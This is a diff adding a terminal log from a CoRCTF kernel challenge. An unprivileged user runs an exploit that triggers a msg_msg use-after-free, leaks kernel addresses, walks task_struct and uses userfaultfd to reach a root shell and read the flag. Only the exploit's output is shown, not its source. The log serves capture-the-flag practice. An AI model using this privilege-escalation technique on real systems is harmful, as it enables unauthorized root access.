@@ -1,0 +1,57 @@
+[+] starting exploit localy...
+c[?7l[2J[0mSeaBIOS (version 1.15.0-1)
+
+
+iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+07F8B340+07ECB340 CA00
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               
+
+
+Booting from ROM..c[?7l[2J[01;31mctf@CoRCTF[00m:[01;34m~[00m$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+[01;31mctf@CoRCTF[00m:[01;34m~[00m$ cd /root
+sh: cd: can't cd to /root: Permission denied
+[01;31mctf@CoRCTF[00m:[01;34m~[00m$ /exp[01;31mctf@CoRCTF[00m:[01;34m~[00m$ /exploit [J
+[ ] Hello, world.
+[.] cleaning heap...
+[.] allocating sample rules...
+[.] dup rule 1...
+[.] deleting inbound 1...
+[.] allocating msg_msg for UAF...
+[+] overwriting msg_msg by UAF.
+[+] receiving msg...
+[+] received 0x12d0 size of msg.
+[!] init_ipc_ns: 0xffffffff81c3d7a0
+[!] init_cred: 0xffffffff81c33060
+[!] init_task: 0xffffffff81c124c0
+[+] starting task_struct walking...
+[.] target addr: 0xffffffff81c124b8: Not exploit task (name: swapper/0)
+[.] target addr: 0xffff888007525ff8: : FOUND!
+[!] current task @ 0xffff888007526000
+[.] cleaning heap...
+[.] allocating sample rules...
+[.] dup rule S1...
+[.] deleting inbound S1...
+[.] preparing uffd
+[.] waiting uffder starts...
+[msg_msg_watcher] registering uffd-visor.
+[msg_msg_watcher] mmapping...
+[msg_msg_watcher] mmapped @ 0xdead000 - 0xdeae000
+[msg_msg_watcher] registered uffd visor.
+[.] allocating temp msg_msg on UAFed slab.
+[msg_msg_watcher] entered fault_handler_thread
+[msg_msg_watcher] polling...
+[!msg_msg_watcher] page fault @ 0xdead000
+[+] overwriting temp msg_msg.next with 0xffff888007526530
+[msg_msg_watcher] copying from 0x7fb790427000 to faulted page.
+
+
+
+[+] HERE IS YOUR NIRUGIRI
+/home/ctf # id
+uid=0(root) gid=0(root)
+/home/ctf # cd /root
+~ # ls
+[0;0me808ed07f269a8bbf153bbe7edf41dcb99a3caf7006147e2e0dccda08c0d86d6[m
+~ # cat e808ed07f269a8bbf153bbe7edf41dcb99a3caf7006147e2e0dccda08c0d86d6
+corctf{MsG_MsG_c4n_d0_m0r3_th@n_sPr@Y}
+~ # 
